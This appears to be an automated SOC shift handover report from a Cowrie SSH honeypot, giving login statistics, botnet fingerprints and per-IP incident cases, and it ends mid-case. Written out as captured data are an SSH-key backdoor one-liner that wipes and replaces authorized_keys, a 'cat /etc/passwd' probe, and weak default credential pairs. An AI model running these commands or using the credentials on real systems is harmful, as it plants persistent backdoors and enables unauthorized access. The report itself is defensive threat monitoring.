# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-09-05 |
| **Generated At** | 2026-09-05T16:41:32Z |
| **Shift Time** | 16:41 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **116** |
| Confirmed Threats | **106** |
| False Positives Filtered | **10** (8.6%) |
| Unique Attacker IPs | **47** |
| Countries of Origin | **22** |
| High Severity Cases | **18** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **98** |
| Malware Samples Analyzed | **4** HIGH · **20** MED · 19 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **27** |
| Unique Credential Pairs | **13** |
| Unique Usernames | **6** |
| Unique Passwords | **11** |
| Successful Auth Pairs | **21** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `admin` | 8 |
| `root` | 6 |
| `support` | 5 |
| `345gs5662d34` | 4 |
| `flash` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `support` | 5 |
| `` | 4 |
| `admin` | 4 |
| `345gs5662d34` | 4 |
| `3245gs5662d34` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `support` | `support` | 5 |
| `admin` | `` | 4 |
| `admin` | `admin` | 4 |
| `345gs5662d34` | `345gs5662d34` | 4 |
| `root` | `3245gs5662d34` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `support` | `support` | `138.226.239.234` | 2026-09-05T13:04:53 |
| `support` | `support` | `10.0.0.73` | 2026-09-05T13:06:35 |
| `support` | `support` | `77.90.185.17` | 2026-09-05T13:07:39 |
| `root` | `PAssword@123` | `217.60.255.130` | 2026-09-05T13:14:46 |
| `admin` | `admin` | `63.249.65.106` | 2026-09-05T13:23:23 |
| `support` | `support` | `176.53.159.196` | 2026-09-05T13:33:55 |
| `root` | `root-1234` | `158.51.126.147` | 2026-09-05T13:34:17 |
| `345gs5662d34` | `345gs5662d34` | `158.51.126.147` | 2026-09-05T13:34:20 |
| `root` | `3245gs5662d34` | `158.51.126.147` | 2026-09-05T13:34:20 |
| `flash` | `flash123` | `103.63.108.25` | 2026-09-05T13:34:42 |
| `345gs5662d34` | `345gs5662d34` | `103.63.108.25` | 2026-09-05T13:34:47 |
| `flash` | `3245gs5662d34` | `103.63.108.25` | 2026-09-05T13:34:49 |
| `user` | `user2025` | `119.18.48.74` | 2026-09-05T14:06:06 |
| `345gs5662d34` | `345gs5662d34` | `119.18.48.74` | 2026-09-05T14:06:14 |
| `user` | `3245gs5662d34` | `119.18.48.74` | 2026-09-05T14:06:18 |
| `root` | `Digital` | `40.82.214.8` | 2026-09-05T14:08:33 |
| `345gs5662d34` | `345gs5662d34` | `40.82.214.8` | 2026-09-05T14:08:37 |
| `root` | `3245gs5662d34` | `40.82.214.8` | 2026-09-05T14:08:38 |
| `root` | `---fuck_you----` | `10.0.0.73` | 2026-09-05T14:20:39 |
| `admin` | `admin` | `10.0.0.73` | 2026-09-05T14:35:26 |
| `admin` | `admin` | `8.216.46.15` | 2026-09-05T14:39:19 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **116** |
| Sessions with Fingerprint | **10** |
| Unique HASSH Fingerprints | **10** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 16 |
| Go SSH scanner | 13 |
| OpenSSH | 4 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 12 | 4 |
| `4e066189c3bb...` | Generic scanner | 9 | 3 |
| `390ffe68a68c...` | Modern SSH client | 2 | 2 |
| `f1e5e9d24e5e...` | Mirai/variant | 2 | 1 |
| `419da4c91ddb...` | Modern SSH client | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 12 | 4 | Mirai/variant |
| `4e066189c3bb...` | Go SSH scanner | 9 | 3 | Generic scanner |
| `95420f9d932d...` | libssh | 3 | 3 | — |
| `390ffe68a68c...` | OpenSSH | 2 | 2 | Modern SSH client |
| `f1e5e9d24e5e...` | Go SSH scanner | 2 | 1 | Mirai/variant |
| `419da4c91ddb...` | libssh | 1 | 1 | Modern SSH client |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `ec9ea89c70f5...` | OpenSSH | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `119.18.48.74`, `40.82.214.8`, `158.51.126.147`, `103.63.108.25`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **47** |
| Unique ASNs | **26** |
| High-Risk ASNs | **18** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 13 | HIGH |
| `AS398324` | Censys, Inc. | 6 | HIGH |
| `AS63949` | Akamai Connected Cloud | 3 | HIGH |
| `AS22927` | Telefonica de Argentina | 2 | LOW |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS3215` | Orange S.A. | 1 | HIGH |
| `AS9318` | SK Broadband Co Ltd | 1 | HIGH |
| `AS394695` | PDR | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (18)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-fdcc0346bf95

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]234` |
| **First Seen** | 2026-09-05 13:04 |
| **Last Seen** | 2026-09-05 13:05 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 13:04:53` | `cowrie.session.connect` |
| `2026-09-05 13:04:53` | `cowrie.client.version` |
| `2026-09-05 13:04:53` | `cowrie.client.kex` |
| `2026-09-05 13:04:53` | `cowrie.login.success` |
| `2026-09-05 13:04:54` | `cowrie.direct-tcpip.request` |
| `2026-09-05 13:04:56` | `cowrie.direct-tcpip.ja4` |
| `2026-09-05 13:04:56` | `cowrie.direct-tcpip.data` |
| `2026-09-05 13:04:58` | `cowrie.direct-tcpip.request` |
| `2026-09-05 13:04:58` | `cowrie.direct-tcpip.ja4` |
| `2026-09-05 13:04:58` | `cowrie.direct-tcpip.data` |
| `2026-09-05 13:05:00` | `cowrie.direct-tcpip.request` |
| `2026-09-05 13:05:00` | `cowrie.direct-tcpip.ja4` |
| `2026-09-05 13:05:00` | `cowrie.direct-tcpip.data` |
| `2026-09-05 13:05:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]234` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]234` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73cb80c549ff

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-05 13:07 |
| **Last Seen** | 2026-09-05 13:07 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 13:07:39` | `cowrie.session.connect` |
| `2026-09-05 13:07:39` | `cowrie.client.version` |
| `2026-09-05 13:07:39` | `cowrie.client.kex` |
| `2026-09-05 13:07:39` | `cowrie.login.success` |
| `2026-09-05 13:07:41` | `cowrie.direct-tcpip.request` |
| `2026-09-05 13:07:41` | `cowrie.direct-tcpip.ja4` |
| `2026-09-05 13:07:41` | `cowrie.direct-tcpip.data` |
| `2026-09-05 13:07:42` | `cowrie.direct-tcpip.request` |
| `2026-09-05 13:07:42` | `cowrie.direct-tcpip.ja4` |
| `2026-09-05 13:07:42` | `cowrie.direct-tcpip.data` |
| `2026-09-05 13:07:43` | `cowrie.direct-tcpip.request` |
| `2026-09-05 13:07:44` | `cowrie.direct-tcpip.ja4` |
| `2026-09-05 13:07:44` | `cowrie.direct-tcpip.data` |
| `2026-09-05 13:07:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2425fcb313b

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-05 13:14 |
| **Last Seen** | 2026-09-05 13:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 13:14:45` | `cowrie.session.connect` |
| `2026-09-05 13:14:45` | `cowrie.client.version` |
| `2026-09-05 13:14:45` | `cowrie.client.kex` |
| `2026-09-05 13:14:46` | `cowrie.login.success` |
| `2026-09-05 13:14:46` | `cowrie.direct-tcpip.request` |
| `2026-09-05 13:14:46` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-05 13:14:46` | `cowrie.direct-tcpip.data` |
| `2026-09-05 13:14:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50be335eba78

| Field | Detail |
|---|---|
| **Source IP** | `63.249.65[.]106` |
| **First Seen** | 2026-09-05 13:23 |
| **Last Seen** | 2026-09-05 13:24 |
| **Session Duration** | 63s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `id, cat /etc/passwd, echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A", enable, system` |
| **TTPs (MITRE)** | T1003.008 · T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 13:23:21` | `cowrie.session.connect` |
| `2026-09-05 13:23:22` | `cowrie.telnet.option` |
| `2026-09-05 13:23:23` | `cowrie.telnet.option` |
| `2026-09-05 13:23:23` | `cowrie.login.success` |
| `2026-09-05 13:23:23` | `cowrie.session.params` |
| `2026-09-05 13:23:24` | `cowrie.telnet.option` |
| `2026-09-05 13:23:24` | `cowrie.telnet.option` |
| `2026-09-05 13:23:24` | `cowrie.command.input` |
| `2026-09-05 13:23:24` | `cowrie.command.input` |
| `2026-09-05 13:23:24` | `cowrie.command.input` |
| `2026-09-05 13:23:24` | `cowrie.command.input` |
| `2026-09-05 13:23:24` | `cowrie.command.failed` |
| `2026-09-05 13:23:24` | `cowrie.command.input` |
| `2026-09-05 13:23:24` | `cowrie.command.failed` |
| `2026-09-05 13:23:24` | `cowrie.command.input` |
| `2026-09-05 13:23:24` | `cowrie.command.failed` |
| `2026-09-05 13:23:24` | `cowrie.command.input` |
| `2026-09-05 13:23:24` | `cowrie.command.input` |
| `2026-09-05 13:23:24` | `cowrie.command.input` |
| `2026-09-05 13:23:24` | `cowrie.command.input` |
| `2026-09-05 13:23:24` | `cowrie.command.failed` |
| `2026-09-05 13:23:24` | `cowrie.command.input` |
| `2026-09-05 13:23:24` | `cowrie.command.failed` |
| `2026-09-05 13:23:24` | `cowrie.command.input` |
| `2026-09-05 13:23:24` | `cowrie.command.failed` |
| `2026-09-05 13:23:24` | `cowrie.command.input` |
| `2026-09-05 13:23:24` | `cowrie.command.failed` |
| `2026-09-05 13:23:24` | `cowrie.command.input` |
| `2026-09-05 13:23:24` | `cowrie.command.input` |
| `2026-09-05 13:23:24` | `cowrie.command.failed` |
| `2026-09-05 13:23:24` | `cowrie.command.input` |
| `2026-09-05 13:23:24` | `cowrie.command.input` |
| `2026-09-05 13:24:25` | `cowrie.log.closed` |
| `2026-09-05 13:24:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `63.249.65[.]106` to AbuseIPDB if not already reported
- [ ] Block `63.249.65[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0503795507b8

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-05 13:33 |
| **Last Seen** | 2026-09-05 13:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 13:33:54` | `cowrie.session.connect` |
| `2026-09-05 13:33:54` | `cowrie.client.version` |
| `2026-09-05 13:33:55` | `cowrie.client.kex` |
| `2026-09-05 13:33:55` | `cowrie.login.success` |
| `2026-09-05 13:33:55` | `cowrie.direct-tcpip.request` |
| `2026-09-05 13:33:55` | `cowrie.direct-tcpip.data` |
| `2026-09-05 13:33:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a68d7d8925b

| Field | Detail |
|---|---|
| **Source IP** | `158.51.126[.]147` |
| **First Seen** | 2026-09-05 13:34 |
| **Last Seen** | 2026-09-05 13:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 13:34:17` | `cowrie.session.connect` |
| `2026-09-05 13:34:17` | `cowrie.client.version` |
| `2026-09-05 13:34:17` | `cowrie.client.kex` |
| `2026-09-05 13:34:17` | `cowrie.login.success` |
| `2026-09-05 13:34:18` | `cowrie.session.params` |
| `2026-09-05 13:34:18` | `cowrie.command.input` |
| `2026-09-05 13:34:18` | `cowrie.command.failed` |
| `2026-09-05 13:34:18` | `cowrie.log.closed` |
| `2026-09-05 13:34:19` | `cowrie.session.params` |
| `2026-09-05 13:34:19` | `cowrie.command.input` |
| `2026-09-05 13:34:19` | `cowrie.session.file_download` |
| `2026-09-05 13:34:19` | `cowrie.log.closed` |
| `2026-09-05 13:34:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.51.126[.]147` to AbuseIPDB if not already reported
- [ ] Block `158.51.126[.]147` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a591c26a161d

| Field | Detail |
|---|---|
| **Source IP** | `158.51.126[.]147` |
| **First Seen** | 2026-09-05 13:34 |
| **Last Seen** | 2026-09-05 13:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 13:34:19` | `cowrie.session.connect` |
| `2026-09-05 13:34:19` | `cowrie.client.version` |
| `2026-09-05 13:34:19` | `cowrie.client.kex` |
| `2026-09-05 13:34:20` | `cowrie.login.success` |
| `2026-09-05 13:34:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.51.126[.]147` to AbuseIPDB if not already reported
- [ ] Block `158.51.126[.]147` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9ee3372153c

| Field | Detail |
|---|---|
| **Source IP** | `158.51.126[.]147` |
| **First Seen** | 2026-09-05 13:34 |
| **Last Seen** | 2026-09-05 13:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 13:34:20` | `cowrie.session.connect` |
| `2026-09-05 13:34:20` | `cowrie.client.version` |
| `2026-09-05 13:34:20` | `cowrie.client.kex` |
| `2026-09-05 13:34:20` | `cowrie.login.success` |
| `2026-09-05 13:34:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.51.126[.]147` to AbuseIPDB if not already reported
- [ ] Block `158.51.126[.]147` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0f1c897290d

| Field | Detail |
|---|---|
| **Source IP** | `103.63.108[.]25` |
| **First Seen** | 2026-09-05 13:34 |
| **Last Seen** | 2026-09-05 13:34 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 13:34:41` | `cowrie.session.connect` |
| `2026-09-05 13:34:41` | `cowrie.client.version` |
| `2026-09-05 13:34:41` | `cowrie.client.kex` |
| `2026-09-05 13:34:42` | `cowrie.login.success` |
| `2026-09-05 13:34:44` | `cowrie.session.params` |
| `2026-09-05 13:34:44` | `cowrie.command.input` |
| `2026-09-05 13:34:44` | `cowrie.command.failed` |
| `2026-09-05 13:34:44` | `cowrie.log.closed` |
| `2026-09-05 13:34:45` | `cowrie.session.params` |
| `2026-09-05 13:34:45` | `cowrie.command.input` |
| `2026-09-05 13:34:45` | `cowrie.session.file_download` |
| `2026-09-05 13:34:45` | `cowrie.log.closed` |
| `2026-09-05 13:34:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.63.108[.]25` to AbuseIPDB if not already reported
- [ ] Block `103.63.108[.]25` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-554dc63e9e3f

| Field | Detail |
|---|---|
| **Source IP** | `103.63.108[.]25` |
| **First Seen** | 2026-09-05 13:34 |
| **Last Seen** | 2026-09-05 13:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 13:34:46` | `cowrie.session.connect` |
| `2026-09-05 13:34:46` | `cowrie.client.version` |
| `2026-09-05 13:34:46` | `cowrie.client.kex` |
| `2026-09-05 13:34:47` | `cowrie.login.success` |
| `2026-09-05 13:34:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.63.108[.]25` to AbuseIPDB if not already reported
- [ ] Block `103.63.108[.]25` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e60f4d860b5

| Field | Detail |
|---|---|
| **Source IP** | `103.63.108[.]25` |
| **First Seen** | 2026-09-05 13:34 |
| **Last Seen** | 2026-09-05 13:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 13:34:48` | `cowrie.session.connect` |
| `2026-09-05 13:34:48` | `cowrie.client.version` |
| `2026-09-05 13:34:48` | `cowrie.client.kex` |
| `2026-09-05 13:34:49` | `cowrie.login.success` |
| `2026-09-05 13:34:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.63.108[.]25` to AbuseIPDB if not already reported
- [ ] Block `103.63.108[.]25` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed0d8ed82db2

| Field | Detail |
|---|---|
| **Source IP** | `119.18.48[.]74` |
| **First Seen** | 2026-09-05 14:06 |
| **Last Seen** | 2026-09-05 14:06 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 14:06:04` | `cowrie.session.connect` |
| `2026-09-05 14:06:04` | `cowrie.client.version` |
| `2026-09-05 14:06:04` | `cowrie.client.kex` |
| `2026-09-05 14:06:06` | `cowrie.login.success` |
| `2026-09-05 14:06:07` | `cowrie.session.params` |
| `2026-09-05 14:06:07` | `cowrie.command.input` |
| `2026-09-05 14:06:07` | `cowrie.command.failed` |
| `2026-09-05 14:06:08` | `cowrie.log.closed` |
| `2026-09-05 14:06:09` | `cowrie.session.params` |
| `2026-09-05 14:06:09` | `cowrie.command.input` |
| `2026-09-05 14:06:10` | `cowrie.session.file_download` |
| `2026-09-05 14:06:10` | `cowrie.log.closed` |
| `2026-09-05 14:06:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.18.48[.]74` to AbuseIPDB if not already reported
- [ ] Block `119.18.48[.]74` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66b5054f86a6

| Field | Detail |
|---|---|
| **Source IP** | `119.18.48[.]74` |
| **First Seen** | 2026-09-05 14:06 |
| **Last Seen** | 2026-09-05 14:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 14:06:11` | `cowrie.session.connect` |
| `2026-09-05 14:06:11` | `cowrie.client.version` |
| `2026-09-05 14:06:12` | `cowrie.client.kex` |
| `2026-09-05 14:06:14` | `cowrie.login.success` |
| `2026-09-05 14:06:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.18.48[.]74` to AbuseIPDB if not already reported
- [ ] Block `119.18.48[.]74` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0711ed228d59

| Field | Detail |
|---|---|
| **Source IP** | `119.18.48[.]74` |
| **First Seen** | 2026-09-05 14:06 |
| **Last Seen** | 2026-09-05 14:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 14:06:16` | `cowrie.session.connect` |
| `2026-09-05 14:06:16` | `cowrie.client.version` |
| `2026-09-05 14:06:16` | `cowrie.client.kex` |
| `2026-09-05 14:06:18` | `cowrie.login.success` |
| `2026-09-05 14:06:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.18.48[.]74` to AbuseIPDB if not already reported
- [ ] Block `119.18.48[.]74` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a899b6c8a00d

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-09-05 14:08 |
| **Last Seen** | 2026-09-05 14:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
